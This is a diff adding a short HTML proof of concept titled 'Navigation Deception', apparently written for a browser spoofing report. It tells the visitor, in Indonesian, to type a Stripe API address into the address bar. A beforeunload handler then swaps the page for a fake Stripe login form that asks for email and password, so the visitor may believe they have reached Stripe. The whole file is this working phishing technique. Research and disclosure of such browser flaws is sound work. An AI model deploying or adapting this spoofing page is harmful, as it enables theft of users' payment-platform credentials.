@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC 1 - Navigation Deception</title>
+</head>
+<body>
+  <div id="content">
+    <h1>Step 1</h1>
+    <p>Ketik <b>https://api.stripe.com</b> di omnibox lalu tekan Enter</p>
+  </div>
+
+  <script>
+    window.onbeforeunload = function () {
+      setTimeout(() => {
+        document.getElementById("content").innerHTML = `
+          <h1>Stripe</h1>
+          <p>Please login to continue</p>
+          <input placeholder="Email"><br><br>
+          <input type="password" placeholder="Password">
+        `;
+      }, 100);
+    };
+  </script>
+</body>
+</html>
